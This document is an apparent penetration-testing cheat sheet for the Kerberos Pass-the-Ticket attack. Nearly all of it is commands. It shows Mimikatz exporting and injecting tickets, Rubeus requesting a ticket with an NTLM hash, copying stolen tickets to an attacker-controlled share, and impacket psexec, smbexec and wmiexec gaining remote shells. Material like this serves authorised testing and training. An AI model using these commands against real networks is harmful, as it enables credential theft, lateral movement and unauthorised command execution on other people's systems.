# Pass The Ticket

## Pass-the-Ticket

Pass-the-Ticket takes advantage of the TGS by exporting service tickets, injecting them into memory (on the target) or caching as environment variable (on Kali Linux) and then authenticating with the injected/cached ticket via. Kerberos-based authentication as opposed to NTLM-based authentication.

* This attack does not require the service/user to have local admin rights on the target.

PTT via the compromised host using the following steps: (exporting -> inject into memory -> psexec.exe)

```powershell
# METHOD 1: Mimikatz
mimikatz> sekurlsa::tickets /export          # export tickets
mimikatz> kerberos::ptt [ticket_name.kirbi]  # inject into memory
cmd> psexec.exe \\target.hostname.com cmd    # authN to remote target using ticket

# METHOD 2: Rubeus
cmd> Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
```

PTT via Kali Linux with the following steps: (exporting -> cache as env var -> psexec.py/smbexec.py/wmiexec.py)

```bash
# export tickets -> copy to Kali
mimikatz> sekurlsa::tickets /export                             
cmd> copy [ticket.kirbi] \\192.168.119.XXX\share\[ticket.kirbi]

# use ticket_converter.py to convert .kirbi to .ccache
# https://github.com/Zer1t0/ticket_converter
$ python ticket_converter.py ticket.kirbi ticket.ccache

# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
